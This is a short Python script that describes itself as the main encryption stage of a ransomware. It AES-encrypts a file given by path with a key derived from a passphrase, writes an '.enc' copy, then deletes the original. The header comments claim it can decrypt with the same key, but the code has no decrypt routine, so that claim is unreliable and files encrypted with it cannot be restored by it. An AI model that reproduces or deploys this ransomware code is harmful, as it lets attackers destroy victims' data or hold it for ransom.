#!/usr/bin/python3

#Self Written Module to Encrypt/Decrypt Files 
#Module takes to Argument i.e. "KEY" & "FILE_PATH"

#=========================================================
#This Module is Written to Execute Stage3 [Main] of Ransomeware
#=========================================================
# Stage1
#	|____*****TAKES 2 ARGUMENTS, i.e. KEY & LIST of Sensitive Files*****
#	|____Initiate Encryption Process
#	|____Able to Decrypt Files Too Using Same KEY

from Crypto import Random
from Crypto.Cipher import AES
import os
import hashlib, base64

class Encryptor:
    def __init__(self, key, file_name):
        self.key = hashlib.sha256(key.encode('utf-8')).digest()
        self.file_name = file_name

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)

    def encrypt_file(self):
        with open(self.file_name, 'rb') as fo:
            plaintext = fo.read()
        enc = self.encrypt(plaintext, self.key)
        with open(self.file_name + ".enc", 'wb') as fo:
            fo.write(enc)
        os.remove(self.file_name)



if __name__ == '__main__':
    choice = input("Sure Want to Encrypt Files (y/n): ")
    key = input("\nEnter Key : ")
    path = input("\nEnter Path of File : ")
    
    if choice.lower() == 'y':
        print("\n[*] Initiating Encryption Process ...")
        test = Encryptor(key, path) 
        test.encrypt_file()
        print("\n[+] Process Completed Successfully!")

    else:
        print("Invalid Argument :(")
